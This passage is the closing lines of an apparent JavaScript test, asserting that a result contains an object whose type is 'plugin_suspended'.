        expect.objectContaining({ type: 'plugin_suspended' }),
      ]),
    )
  })
})
